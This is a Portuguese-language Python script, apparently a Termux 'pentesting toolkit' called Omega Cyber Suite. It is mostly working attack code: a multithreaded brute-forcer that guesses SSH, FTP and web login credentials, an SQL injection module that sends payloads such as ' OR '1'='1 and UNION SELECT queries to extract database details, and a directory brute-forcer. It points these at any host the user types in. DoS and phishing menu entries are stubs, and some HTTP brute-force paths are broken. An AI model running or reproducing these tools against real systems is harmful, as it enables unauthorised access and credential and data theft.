#!/data/data/com.termux/files/usr/bin/python3
# Omega Cyber Suite v5.0 - Ultimate Pentesting Toolkit (Termux Edition)
# By OMEGA - Optimized for Android/Termux

import os
import sys
import time
import socket
import random
import argparse
import asyncio
import aiohttp
import threading
import ipaddress
import dns.resolver
import requests
import readline
import re
import smtplib
import ssl
import paramiko
import ftplib
import json
import base64
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin, quote
from datetime import datetime
from bs4 import BeautifulSoup
from flask import Flask, request, render_template, redirect, url_for, make_response
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Configurações globais para Termux
MAX_THREADS = 500  # Reduzido para melhor performance no Android
TIMEOUT = 10
USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 14; SM-S928U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36'
]

# Cores para o terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Banner otimizado para Termux
def show_banner():
    os.system('clear')
    print(f"""{Colors.PURPLE}
    ██████╗ ███╗   ███╗███████╗ ██████╗  █████╗ 
    ██╔═══██╗████╗ ████║██╔════╝██╔════╝ ██╔══██╗
    ██║   ██║██╔████╔██║█████╗  ██║  ███╗███████║
    ██║   ██║██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║
    ╚██████╔╝██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║
     ╚═════╝ ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
    {Colors.CYAN}Termux Edition v5.0{Colors.END}
    {Colors.YELLOW}By OMEGA | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}
    """)

# Menu principal otimizado
def show_menu():
    print(f"\n{Colors.BOLD}{Colors.BLUE}┌──[{Colors.END}OMEGA{Colors.BOLD}{Colors.BLUE}][{Colors.END}MAIN{Colors.BOLD}{Colors.BLUE}]{Colors.END}")
    print(f"{Colors.BOLD}{Colors.BLUE}├─┬─[{Colors.END}Escolha:{Colors.BOLD}{Colors.BLUE}]{Colors.END}")
    print(f"{Colors.BOLD}{Colors.BLUE}│ ├─{Colors.GREEN}[1]{Colors.END} DoS Attack")
    print(f"{Colors.BOLD}{Colors.BLUE}│ ├─{Colors.GREEN}[2]{Colors.END} Vuln Scanner")
    print(f"{Colors.BOLD}{Colors.BLUE}│ ├─{Colors.GREEN}[3]{Colors.END} Subdomain/IP Scan")
    print(f"{Colors.BOLD}{Colors.BLUE}│ ├─{Colors.GREEN}[4]{Colors.END} Port Scanner")
    print(f"{Colors.BOLD}{Colors.BLUE}│ ├─{Colors.GREEN}[5]{Colors.END} Web Analyzer")
    print(f"{Colors.BOLD}{Colors.BLUE}│ ├─{Colors.GREEN}[6]{Colors.END} Phishing Toolkit")
    print(f"{Colors.BOLD}{Colors.BLUE}│ ├─{Colors.GREEN}[7]{Colors.END} Bruteforce (Hydra)")
    print(f"{Colors.BOLD}{Colors.BLUE}│ ├─{Colors.GREEN}[8]{Colors.END} SQLi Exploiter")
    print(f"{Colors.BOLD}{Colors.BLUE}│ ├─{Colors.GREEN}[9]{Colors.END} Dir Bruteforce")
    print(f"{Colors.BOLD}{Colors.BLUE}│ └─{Colors.RED}[0]{Colors.END} Sair")
    print(f"{Colors.BOLD}{Colors.BLUE}└───┴───────────────────────{Colors.END}\n")

# ===========================================
# MÓDULO AVANÇADO DE BRUTEFORCE (HYDRA-LIKE)
# ===========================================
class AdvancedBruteforce:
    SUPPORTED_PROTOCOLS = ['ssh', 'ftp', 'http', 'rdp', 'smb', 'mysql', 'postgresql']
    
    def __init__(self):
        self.found_credentials = []
        self.active_threads = 0
        self.stop_signal = False
    
    def ssh_bruteforce(self, target, port, username, password):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target, port=port, username=username, password=password, timeout=TIMEOUT)
            client.close()
            return True
        except:
            return False
    
    def ftp_bruteforce(self, target, port, username, password):
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=TIMEOUT)
            ftp.login(username, password)
            ftp.quit()
            return True
        except:
            return False
    
    def http_basic_bruteforce(self, target, port, username, password, path='/', method='GET'):
        url = f"http://{target}:{port}{path}"
        try:
            if method.upper() == 'GET':
                response = requests.get(url, auth=(username, password), timeout=TIMEOUT)
            else:
                response = requests.post(url, auth=(username, password), timeout=TIMEOUT)
            return response.status_code < 400
        except:
            return False
    
    def http_form_bruteforce(self, target, port, username, password, login_url, username_field, password_field, success_indicator):
        url = f"http://{target}:{port}{login_url}"
        try:
            payload = {
                username_field: username,
                password_field: password
            }
            response = requests.post(url, data=payload, timeout=TIMEOUT)
            return success_indicator in response.text
        except:
            return False
    
    def worker(self, target, port, protocol, username, password, **kwargs):
        if self.stop_signal:
            return
        
        self.active_threads += 1
        success = False
        
        try:
            if protocol == 'ssh':
                success = self.ssh_bruteforce(target, port, username, password)
            elif protocol == 'ftp':
                success = self.ftp_bruteforce(target, port, username, password)
            elif protocol == 'http-basic':
                success = self.http_basic_bruteforce(target, port, username, password, **kwargs)
            elif protocol == 'http-form':
                success = self.http_form_bruteforce(target, port, username, password, **kwargs)
            
            if success:
                print(f"{Colors.GREEN}[+] ACESSO: {username}:{password}{Colors.END}")
                self.found_credentials.append((username, password))
                self.stop_signal = True
        except Exception as e:
            pass
        
        self.active_threads -= 1
    
    def start_attack(self, target, port, protocol, username_list, password_list, max_threads=50, **kwargs):
        if protocol not in self.SUPPORTED_PROTOCOLS:
            print(f"{Colors.RED}[!] Protocolo não suportado: {protocol}{Colors.END}")
            return []
        
        self.found_credentials = []
        self.stop_signal = False
        
        if isinstance(username_list, str):
            username_list = [username_list]
        if isinstance(password_list, str):
            password_list = [password_list]
        
        total_attempts = len(username_list) * len(password_list)
        completed_attempts = 0
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            
            for username in username_list:
                for password in password_list:
                    if self.stop_signal:
                        break
                    
                    futures.append(
                        executor.submit(
                            self.worker, target, port, protocol, username, password, **kwargs
                        )
                    )
                    time.sleep(0.05)  # Intervalo maior para Android
                    
                    completed_attempts += 1
                    progress = (completed_attempts / total_attempts) * 100
                    elapsed = time.time() - start_time
                    sys.stdout.write(
                        f"\r{Colors.BLUE}[*] Progresso: {completed_attempts}/{total_attempts} "
                        f"({progress:.2f}%) | Threads: {self.active_threads}{Colors.END}"
                    )
                    sys.stdout.flush()
                
                if self.stop_signal:
                    break
            
            for future in futures:
                try:
                    future.result(timeout=TIMEOUT)
                except:
                    pass
        
        print(f"\n{Colors.CYAN}[*] Concluído! Credenciais encontradas: {len(self.found_credentials)}{Colors.END}")
        return self.found_credentials

def bruteforce_tool():
    show_banner()
    print(f"{Colors.RED}{Colors.BOLD}╔══════════════════════╗")
    print(f"║  BRUTEFORCE (HYDRA) ║")
    print(f"╚══════════════════════╝{Colors.END}")
    
    bf = AdvancedBruteforce()
    
    target = input(f"\n{Colors.YELLOW}[?] IP/Host: {Colors.END}")
    port = int(input(f"{Colors.YELLOW}[?] Porta: {Colors.END}") or 22)
    
    print(f"\n{Colors.YELLOW}[?] Protocolo:{Colors.END}")
    for i, proto in enumerate(bf.SUPPORTED_PROTOCOLS, 1):
        print(f"  {Colors.GREEN}{i}{Colors.END} {proto.upper()}")
    proto_idx = int(input(f"{Colors.YELLOW}[?] Escolha (1-{len(bf.SUPPORTED_PROTOCOLS)}): {Colors.END}")) - 1
    protocol = bf.SUPPORTED_PROTOCOLS[proto_idx]
    
    kwargs = {}
    if protocol.startswith('http'):
        if protocol == 'http-form':
            kwargs['login_url'] = input(f"{Colors.YELLOW}[?] URL de Login: {Colors.END}") or '/login'
            kwargs['username_field'] = input(f"{Colors.YELLOW}[?] Campo Usuário: {Colors.END}") or 'username'
            kwargs['password_field'] = input(f"{Colors.YELLOW}[?] Campo Senha: {Colors.END}") or 'password'
            kwargs['success_indicator'] = input(f"{Colors.YELLOW}[?] Indicador de Sucesso: {Colors.END}") or 'Welcome'
        else:
            kwargs['path'] = input(f"{Colors.YELLOW}[?] Caminho Protegido: {Colors.END}") or '/'
            kwargs['method'] = input(f"{Colors.YELLOW}[?] Método HTTP (GET/POST): {Colors.END}") or 'GET'
    
    username_source = input(f"{Colors.YELLOW}[?] Usuários (1=Único, 2=Arquivo, 3=Comuns): {Colors.END}")
    if username_source == '1':
        username_list = [input(f"{Colors.YELLOW}[?] Usuário: {Colors.END}")]
    elif username_source == '2':
        user_file = input(f"{Colors.YELLOW}[?] Arquivo de usuários: {Colors.END}")
        try:
            with open(user_file, 'r') as f:
                username_list = [line.strip() for line in f]
        except:
            print(f"{Colors.RED}[!] Arquivo não encontrado! Usando padrão.{Colors.END}")
            username_list = ['admin', 'root', 'user']
    else:
        username_list = ['admin', 'root', 'user', 'test']
    
    password_source = input(f"{Colors.YELLOW}[?] Senhas (1=Única, 2=Arquivo, 3=Comuns): {Colors.END}")
    if password_source == '1':
        password_list = [input(f"{Colors.YELLOW}[?] Senha: {Colors.END}")]
    elif password_source == '2':
        pass_file = input(f"{Colors.YELLOW}[?] Arquivo de senhas: {Colors.END}")
        try:
            with open(pass_file, 'r') as f:
                password_list = [line.strip() for line in f]
        except:
            print(f"{Colors.RED}[!] Arquivo não encontrado! Usando padrão.{Colors.END}")
            password_list = ['password', '123456', 'admin']
    else:
        password_list = ['password', '123456', 'admin', 'root', '12345']
    
    threads = min(int(input(f"{Colors.YELLOW}[?] Threads (max {MAX_THREADS}): {Colors.END}") or 30), MAX_THREADS)
    
    print(f"\n{Colors.CYAN}[*] Iniciando ataque em {target}:{port}...{Colors.END}")
    results = bf.start_attack(target, port, protocol, username_list, password_list, threads, **kwargs)
    
    if results:
        print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════╗")
        print(f"║  CREDENCIAIS  ║")
        print(f"╚══════════════════╝{Colors.END}")
        for i, (user, pwd) in enumerate(results, 1):
            print(f"{Colors.GREEN}{i}. {user}:{pwd}{Colors.END}")
    
    input(f"\n{Colors.YELLOW}[Enter para voltar]{Colors.END}")

# ===========================================
# MÓDULO DE SQL INJECTION (SQLMAP-LIKE)
# ===========================================
class SQLInjectionExploiter:
    PAYLOADS = {
        'error_based': ["'", "' OR '1'='1"],
        'time_based': ["' OR SLEEP(5)--"],
        'boolean_based': ["' OR 1=1--"]
    }
    
    def __init__(self):
        self.vulnerable_params = []
        self.extracted_data = []
    
    def test_url(self, url, params, payload):
        try:
            test_params = params.copy()
            for key in test_params:
                test_params[key] += payload
            
            response = requests.get(url, params=test_params, timeout=TIMEOUT)
            
            if 'sql' in response.text.lower() or 'syntax' in response.text.lower():
                return 'error_based'
            
            start_time = time.time()
            requests.get(url, params=test_params, timeout=TIMEOUT)
            elapsed = time.time() - start_time
            if elapsed > 4:
                return 'time_based'
                
        except:
            pass
        
        return None
    
    def exploit_param(self, url, param_name, param_value, technique):
        print(f"{Colors.CYAN}[*] Explorando: {param_name}{Colors.END}")
        
        if technique in ['error_based', 'boolean_based']:
            payload = f"' UNION SELECT NULL,@@version,NULL--"
            response = requests.get(url, params={param_name: param_value + payload}, timeout=TIMEOUT)
            
            version_match = re.search(r'(\d+\.\d+\.\d+)-[A-Za-z0-9]+', response.text)
            if version_match:
                version = version_match.group(1)
                print(f"{Colors.GREEN}[+] Versão DB: {version}{Colors.END}")
                self.extracted_data.append(('Versão DB', version))
            
            payload = f"' UNION SELECT NULL,database(),NULL--"
            response = requests.get(url, params={param_name: param_value + payload}, timeout=TIMEOUT)
            db_name_match = re.search(r'([a-zA-Z_][a-zA-Z0-9_]{3,})', response.text)
            if db_name_match:
                db_name = db_name_match.group(1)
                print(f"{Colors.GREEN}[+] Banco de dados: {db_name}{Colors.END}")
                self.extracted_data.append(('Banco de dados', db_name))
        
        return True
    
    def scan_url(self, url):
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        params = {}
        for param in parsed_url.query.split('&'):
            if '=' in param:
                key, value = param.split('=', 1)
                params[key] = value
        
        print(f"{Colors.CYAN}[*] Scan SQLi em {url}{Colors.END}")
        
        for param_name, param_value in params.items():
            print(f"{Colors.BLUE}[*] Testando: {param_name}{Colors.END}")
            
            for technique, payloads in self.PAYLOADS.items():
                for payload in payloads:
                    vuln_type = self.test_url(base_url, {param_name: param_value}, payload)
                    if vuln_type:
                        print(f"{Colors.GREEN}[+] Vulnerável: {param_name} ({technique}){Colors.END}")
                        self.vulnerable_params.append((param_name, technique))
                        self.exploit_param(base_url, param_name, param_value, technique)
                        break
        
        if not self.vulnerable_params:
            print(f"{Colors.RED}[-] Nenhuma vulnerabilidade SQLi encontrada{Colors.END}")
        
        return self.vulnerable_params, self.extracted_data

def sql_injection_tool():
    show_banner()
    print(f"{Colors.RED}{Colors.BOLD}╔══════════════════╗")
    print(f"║  SQLi EXPLOITER ║")
    print(f"╚══════════════════╝{Colors.END}")
    
    sqli = SQLInjectionExploiter()
    
    url = input(f"\n{Colors.YELLOW}[?] URL (com parâmetros): {Colors.END}")
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(f"\n{Colors.CYAN}[*] Iniciando scan SQLi...{Colors.END}")
    vulnerable_params, extracted_data = sqli.scan_url(url)
    
    if vulnerable_params:
        print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════╗")
        print(f"║  VULNERABILIDADES ║")
        print(f"╚══════════════════╝{Colors.END}")
        for i, (param, technique) in enumerate(vulnerable_params, 1):
            print(f"{Colors.GREEN}{i}. Parâmetro: {param} ({technique}){Colors.END}")
        
        if extracted_data:
            print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════╗")
            print(f"║  DADOS EXTRAÍDOS ║")
            print(f"╚══════════════════╝{Colors.END}")
            for i, (data_type, value) in enumerate(extracted_data, 1):
                print(f"{Colors.GREEN}{i}. {data_type}: {value}{Colors.END}")
    
    input(f"\n{Colors.YELLOW}[Enter para voltar]{Colors.END}")

# ===========================================
# MÓDULO DE BRUTEFORCE DE DIRETÓRIOS
# ===========================================
class DirectoryBruteforcer:
    def __init__(self):
        self.found_dirs = []
    
    def check_directory(self, base_url, directory, status_codes, hide_404):
        url = f"{base_url}/{directory}"
        try:
            response = requests.get(url, timeout=TIMEOUT, allow_redirects=False)
            
            if not hide_404 or response.status_code != 404:
                color = Colors.GREEN if response.status_code < 400 else Colors.YELLOW
                print(f"{color}[{response.status_code}] {url}{Colors.END}")
            
            if response.status_code in status_codes:
                self.found_dirs.append((url, response.status_code))
            
            return True
        except:
            return False
    
    def start_scan(self, base_url, wordlist_file, extensions, status_codes, threads=20, hide_404=True):
        if not base_url.endswith('/'):
            base_url += '/'
        
        try:
            with open(wordlist_file, 'r', errors='ignore') as f:
                directories = [line.strip() for line in f]
        except:
            print(f"{Colors.RED}[!] Erro ao ler wordlist!{Colors.END}")
            return []
        
        if extensions:
            new_dirs = []
            for ext in extensions.split(','):
                new_dirs.extend([f"{d}.{ext.strip()}" for d in directories])
            directories = new_dirs
        
        total = len(directories)
        completed = 0
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            for directory in directories:
                futures.append(
                    executor.submit(
                        self.check_directory, base_url, directory, status_codes, hide_404
                    )
                )
                
                completed += 1
                progress = (completed / total) * 100
                elapsed = time.time() - start_time
                sys.stdout.write(
                    f"\r{Colors.BLUE}[*] Progresso: {completed}/{total} "
                    f"({progress:.2f}%) | Encontrados: {len(self.found_dirs)}{Colors.END}"
                )
                sys.stdout.flush()
            
            for future in futures:
                try:
                    future.result(timeout=TIMEOUT)
                except:
                    pass
        
        print(f"\n{Colors.CYAN}[*] Concluído! Recursos encontrados: {len(self.found_dirs)}{Colors.END}")
        return self.found_dirs

def directory_bruteforce_tool():
    show_banner()
    print(f"{Colors.RED}{Colors.BOLD}╔══════════════════╗")
    print(f"║  DIR BRUTEFORCE ║")
    print(f"╚══════════════════╝{Colors.END}")
    
    dbf = DirectoryBruteforcer()
    
    url = input(f"\n{Colors.YELLOW}[?] URL alvo: {Colors.END}")
    if not url.startswith('http'):
        url = 'http://' + url
    
    wordlist = input(f"{Colors.YELLOW}[?] Wordlist (padrão: common.txt): {Colors.END}") or "common.txt"
    
    if not os.path.exists(wordlist):
        print(f"{Colors.RED}[!] Wordlist não encontrada!{Colors.END}")
        input(f"{Colors.YELLOW}[Enter para voltar]{Colors.END}")
        return
    
    extensions = input(f"{Colors.YELLOW}[?] Extensões (ex: php,html): {Colors.END}")
    status_codes = [int(c) for c in input(f"{Colors.YELLOW}[?] Códigos HTTP (200,301,302): {Colors.END}") or "200,301,302".split(',')]
    threads = min(int(input(f"{Colors.YELLOW}[?] Threads (max {MAX_THREADS}): {Colors.END}") or 20), MAX_THREADS)
    hide_404 = input(f"{Colors.YELLOW}[?] Ocultar 404? (s/n): {Colors.END}").lower() == 's'
    
    print(f"\n{Colors.CYAN}[*] Iniciando brute force em {url}...{Colors.END}")
    found_dirs = dbf.start_scan(url, wordlist, extensions, status_codes, threads, hide_404)
    
    if found_dirs:
        print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════╗")
        print(f"║  RECURSOS ENCONTRADOS ║")
        print(f"╚══════════════════╝{Colors.END}")
        for i, (path, code) in enumerate(found_dirs, 1):
            color = Colors.GREEN if code < 400 else Colors.YELLOW
            print(f"{color}{i}. [{code}] {path}{Colors.END}")
    
    input(f"\n{Colors.YELLOW}[Enter para voltar]{Colors.END}")

# Funções simplificadas para Termux
def dos_attack():
    show_banner()
    print(f"{Colors.RED}DoS Attack não disponível no Termux por limitações de rede.{Colors.END}")
    input(f"{Colors.YELLOW}[Enter para voltar]{Colors.END}")

def vulnerability_scanner():
    show_banner()
    print(f"{Colors.GREEN}Em desenvolvimento...{Colors.END}")
    input(f"{Colors.YELLOW}[Enter para voltar]{Colors.END}")

def subdomain_scanner():
    show_banner()
    print(f"{Colors.GREEN}Em desenvolvimento...{Colors.END}")
    input(f"{Colors.YELLOW}[Enter para voltar]{Colors.END}")

def port_scanner():
    show_banner()
    print(f"{Colors.GREEN}Em desenvolvimento...{Colors.END}")
    input(f"{Colors.YELLOW}[Enter para voltar]{Colors.END}")

def web_analyzer():
    show_banner()
    print(f"{Colors.GREEN}Em desenvolvimento...{Colors.END}")
    input(f"{Colors.YELLOW}[Enter para voltar]{Colors.END}")

def phishing_toolkit():
    show_banner()
    print(f"{Colors.RED}Phishing Toolkit não disponível no Termux.{Colors.END}")
    input(f"{Colors.YELLOW}[Enter para voltar]{Colors.END}")

def network_recon():
    show_banner()
    print(f"{Colors.GREEN}Em desenvolvimento...{Colors.END}")
    input(f"{Colors.YELLOW}[Enter para voltar]{Colors.END}")

# Loop principal
def main():
    # Verificação de dependências
    missing = []
    try:
        import aiohttp
    except ImportError:
        missing.append("aiohttp")
    
    try:
        import paramiko
    except ImportError:
        missing.append("paramiko")
    
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        missing.append("beautifulsoup4")
    
    if missing:
        print(f"{Colors.RED}[!] Bibliotecas faltando: {', '.join(missing)}{Colors.END}")
        print(f"{Colors.YELLOW}[*] Instale com: pip install {' '.join(missing)}{Colors.END}")
        sys.exit(1)
    
    while True:
        show_banner()
        show_menu()
        
        choice = input(f"{Colors.YELLOW}[OMEGA] Opção: {Colors.END}")
        
        if choice == '1':
            dos_attack()
        elif choice == '2':
            vulnerability_scanner()
        elif choice == '3':
            subdomain_scanner()
        elif choice == '4':
            port_scanner()
        elif choice == '5':
            web_analyzer()
        elif choice == '6':
            phishing_toolkit()
        elif choice == '7':
            bruteforce_tool()
        elif choice == '8':
            sql_injection_tool()
        elif choice == '9':
            directory_bruteforce_tool()
        elif choice == '0':
            print(f"\n{Colors.PURPLE}{Colors.BOLD}Até logo!{Colors.END}")
            sys.exit(0)
        else:
            print(f"{Colors.RED}[!] Opção inválida!{Colors.END}")
            time.sleep(1)

if __name__ == "__main__":
    main()
